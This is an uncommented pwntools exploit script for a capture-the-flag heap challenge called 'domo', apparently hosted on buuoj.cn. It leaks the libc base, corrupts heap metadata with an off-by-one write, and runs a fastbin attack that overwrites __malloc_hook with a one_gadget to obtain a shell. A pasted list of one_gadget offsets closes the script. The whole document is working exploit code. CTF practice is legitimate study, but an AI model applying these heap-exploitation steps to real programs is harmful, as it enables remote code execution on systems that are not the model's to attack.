#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./domo")
	elf = ELF("./domo")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote('node3.buuoj.cn',25381)
	elf = ELF("./domo")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def menu(cmd):
    sla('5: Exit\n',str(cmd))

def add(size,content):
    menu(1)
    sla("size:\n",str(size))
    if(len(content)==8):
        sda("content:\n",content)
    else:
        sla("content:\n",content)

def delete(idx):
    menu(2)
    sla("index:",str(idx))

def show(idx):
    menu(3)
    sla("index:",str(idx))

def edit(addr,content):
    menu(4)
    sla("addr:",str(addr))
    sla("num:",str(content))


###leak libc###
add(0x80,'AAAA')#0
add(0x10,'BBBB')#1

delete(0)

add(0x80,'AAAAAAAA')#0

show(0)
ru('A'*8)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x3c4b20

success('libc base:'+hex(libc_base))

###off-by-one to consolidate###
add(0x68,'CCCC')#2
add(0xf0,'DDDD')#3
add(0x80,'EEEE')#4


payload = 'A' * 0x60 + p64(0x120)
delete(2)

add(0x68,payload)#2

delete(2)
delete(0)
delete(3)

###fastbin attack###
one_gadget = libc_base + 0xf1147
malloc_hook = libc_base + libc.symbols['__malloc_hook']
realloc_hook = libc_base + libc.symbols['__libc_realloc']

payload = '\x00' * 0x80 + p64(0) + p64(0x21) + '\x00' * 0x10 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
add(0x110,payload)

add(0x60,'fastbin')
payload = 'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 0x4)
add(0x60,payload)

###get shell###
menu(5)
ia()

'''
Railgun@ubuntu:~/Desktop$ one_gadget /lib/x86_64-linux-gnu/libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
Railgun@ubuntu:~/Desk
'''